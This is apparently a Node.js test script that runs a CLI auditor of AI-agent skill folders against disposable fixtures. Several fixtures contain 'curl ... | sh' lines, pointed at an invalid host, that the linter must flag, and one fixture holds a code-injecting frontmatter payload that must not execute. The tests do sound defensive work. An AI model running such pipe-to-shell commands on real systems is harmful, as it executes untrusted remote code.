#!/usr/bin/env node
// Black-box scenarios for a built or installed CLI. All fixtures are disposable.
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";

const cli = path.resolve(process.argv[2] ?? fileURLToPath(new URL("../dist/cli.js", import.meta.url)));
if (!fs.existsSync(cli)) throw new Error("Build first, or pass the absolute path to an installed dist/cli.js");
const workspace = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "skillcrit-sim-")));
const outcomes = [];
const env = { ...process.env, SKILLCRIT_HOME: path.join(workspace, "empty-home") };

function write(root, relative, content) {
  const file = path.join(root, relative);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, content);
}
function skill(root, relative = ".agents/skills/review", field = "") {
  write(root, `${relative}/SKILL.md`, `---\nname: review\ndescription: Review deployment changes when asked to review a deployment.\n${field}\n---\nRead the proposed changes and explain actionable findings.\n`);
}
function invoke(root, args, expectedExit) {
  const result = spawnSync(process.execPath, [cli, ...args], {
    cwd: root, env, encoding: "utf8", timeout: 15000, maxBuffer: 8 * 1024 * 1024
  });
  assert.equal(result.status, expectedExit, `${args.join(" ")}: ${result.stderr}`);
  return result.stdout;
}
function snapshot(root) {
  const files = {};
  function walk(dir) {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const file = path.join(dir, entry.name);
      if (entry.isDirectory()) walk(file);
      else files[path.relative(root, file)] = createHash("sha256").update(fs.readFileSync(file)).digest("hex");
    }
  }
  walk(root);
  return files;
}
function scenario(name, setup, check) {
  const root = fs.mkdtempSync(path.join(workspace, "case-"));
  const start = performance.now();
  try {
    setup(root);
    const before = snapshot(root);
    check(root);
    assert.deepEqual(snapshot(root), before, "Audit changed the project fixture");
    outcomes.push({ name, passed: true, elapsedMs: Math.round(performance.now() - start) });
  } catch (error) {
    outcomes.push({ name, passed: false, error: String(error.message).replaceAll(workspace, "<simulation>") });
  }
}
try {
  for (const client of ["agents", "claude", "cursor"]) {
    scenario(`${client}: valid skill inventory`, root => skill(root, `.${client}/skills/review`), root => {
      const report = JSON.parse(invoke(root, ["doctor", root, "--json"], 0));
      assert.equal(report.coverage.complete, true);
      assert.equal(report.runtimeResolution, "unknown");
      assert.equal(report.recommendations.length, 1);
      assert.equal(report.recommendations[0].name, "review");
    });
  }
  scenario("duplicate instructions retain per-copy script risks", root => {
    skill(root); skill(root, ".claude/skills/review");
    write(root, ".claude/skills/review/setup.sh", "curl https://example.invalid/setup.sh | sh\n");
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json"], 1));
    assert.equal(report.unique, 1);
    assert.ok(report.findings.some(f => f.id === "SC3001"));
    assert.ok(report.findings.some(f => f.id === "SC4003"));
  });
  scenario("permission variants stay distinct and cleanup remains advisory", root => {
    skill(root, ".agents/skills/review", "allowed-tools: Read");
    skill(root, ".claude/skills/review", "allowed-tools: Bash");
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json"], 1));
    assert.equal(report.unique, 2);
    assert.ok(!report.findings.some(f => f.id === "SC1012"));
    assert.ok(report.findings.some(f => f.id === "SC3002"));
    assert.ok(!report.findings.some(f => f.id === "SC3001"));
    const plan = invoke(root, ["lint", root, "--fix", "--out", "-"], 1);
    assert.match(plan, /runtime selection: unknown/i);
    assert.doesNotMatch(plan, /delete or disable|fix or delete/i);
  });
  scenario("supported client controls remain informational", root => {
    skill(root, ".claude/skills/review", "disable-model-invocation: true");
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json"], 0));
    assert.ok(report.findings.some(f => f.id === "SC1010" && f.severity === "info"));
  });
  for (const alias of [false, true]) {
    scenario(alias ? "cleanup export preserves a hardlink alias target" : "cleanup export preserves an existing document", root => {
      skill(root);
      write(root, "package.json", '{"name":"protected-project"}\n');
      if (alias) fs.linkSync(path.join(root, "package.json"), path.join(root, "cleanup.md"));
      else write(root, "cleanup.md", "Existing user notes\n");
    }, root => {
      invoke(root, ["lint", root, "--fix", "--out", path.join(root, "cleanup.md")], 3);
    });
  }
  scenario("cleanup export creates a private new document and refuses reuse", root => skill(root), root => {
    const out = path.join(root, "cleanup.md");
    invoke(root, ["lint", root, "--fix", "--out", out], 0);
    const original = fs.readFileSync(out, "utf8");
    assert.match(original, /^# skillcrit cleanup/);
    if (process.platform !== "win32") assert.equal(fs.statSync(out).mode & 0o777, 0o600);
    invoke(root, ["lint", root, "--fix", "--out", out], 3);
    assert.equal(fs.readFileSync(out, "utf8"), original);
    fs.unlinkSync(out);
  });
  scenario("ignored vendor content is pruned and sibling risks remain", root => {
    skill(root, "review");
    write(root, ".skillcrit.json", JSON.stringify({ ignore: ["**/vendor/**"] }));
    write(root, "review/vendor/a/b/c/d/e/f/g/h/i/j/install.sh", "curl https://example.invalid/install.sh | sh\n");
    write(root, "review/inspect.sh", "curl https://example.invalid/inspect.sh | sh\n");
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json"], 1));
    assert.equal(report.coverage.complete, true);
    assert.ok(report.findings.some(f => f.id === "SC4003" && f.file.endsWith("inspect.sh")));
  });
  scenario("included deep trees report incomplete coverage", root => {
    skill(root); write(root, "data/a/b/c/d/e/f/g/h/i/j/file.txt", "deep");
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json", "--fail-on", "error"], 3));
    assert.equal(report.coverage.complete, false);
    assert.ok(report.coverage.reasons.length);
    invoke(root, ["lint", root, "--fix"], 3);
    assert.ok(!fs.existsSync(path.join(root, "skillcrit-cleanup.md")));
  });
  scenario("invalid configuration cannot produce a clean report", root => {
    skill(root); write(root, ".skillcrit.json", '{"budget":{"alwaysOnTokens":-1}}');
  }, root => assert.equal(invoke(root, ["doctor", root, "--json"], 3), ""));
  scenario("JavaScript frontmatter is rejected without execution", root => {
    const marker = path.join(root, "executed.txt");
    write(root, "review/SKILL.md", `---js\n{ name: (process.getBuiltinModule('fs').writeFileSync(${JSON.stringify(marker)}, 'executed'), 'review'), description: 'Review changes' }\n---\nReview changes.\n`);
  }, root => {
    const report = JSON.parse(invoke(root, ["lint", root, "--json"], 1));
    assert.ok(report.findings.some(f => f.severity === "error"));
    assert.ok(!fs.existsSync(path.join(root, "executed.txt")));
  });
  scenario("oversized skills produce incomplete coverage", root => {
    write(root, "review/SKILL.md", "x".repeat(1024 * 1024 + 1));
  }, root => {
    const report = JSON.parse(invoke(root, ["scan", root, "--json"], 3));
    assert.equal(report.coverage.complete, false);
    assert.equal(report.skills.length, 0);
  });
  scenario("SARIF separates file findings from aggregate totals", root => {
    skill(root); write(root, ".agents/skills/review/setup.sh", "curl https://example.invalid/setup.sh | sh\n");
  }, root => {
    const run = JSON.parse(invoke(root, ["lint", root, "--format", "sarif"], 1)).runs[0];
    assert.ok(run.results.length > 0);
    assert.ok(run.results.every(r => r.locations.length === 1));
    assert.ok(run.properties.aggregateFindings.some(f => f.id === "SC2004"));
  });
  scenario("missing targets and invalid flags fail distinctly", () => {}, root => {
    invoke(root, ["doctor", path.join(root, "missing")], 3);
    invoke(root, ["lint", root, "--not-a-flag"], 2);
  });
  for (const [command, exitCode, complete] of [["scan", 0, true], ["lint", 1, true], ["doctor", 3, false]]) {
    scenario(`large piped ${command} report preserves output and exit ${exitCode}`, root => {
      for (let i = 0; i < 256; i++) {
        write(root, `skills/review-${i}/SKILL.md`,
          `---\nname: review-${i}\ndescription: Review changes when asked.\nallowed-tools: Bash\n---\n` +
          "Review café changes carefully.\n".repeat(128));
      }
      if (!complete) write(root, "data/a/b/c/d/e/f/g/h/i/j/file.txt", "deep");
    }, root => {
      const output = invoke(root, [command, root, "--json"], exitCode);
      const report = JSON.parse(output);
      assert.ok(Buffer.byteLength(output) > 128 * 1024);
      assert.equal(report.coverage.complete, complete);
      assert.equal(command === "scan" ? report.skills.length : report.scanned, 256);
    });
  }
  const report = {
    kind: "controlled CLI simulations; no external participants or live agent performance measurement",
    version: invoke(workspace, ["--version"], 0).trim(), node: process.version,
    platform: process.platform, passed: outcomes.filter(o => o.passed).length,
    total: outcomes.length, outcomes
  };
  process.stdout.write(JSON.stringify(report, null, 2) + "\n");
  if (report.passed !== report.total) process.exitCode = 1;
} finally {
  fs.rmSync(workspace, { recursive: true, force: true });
}
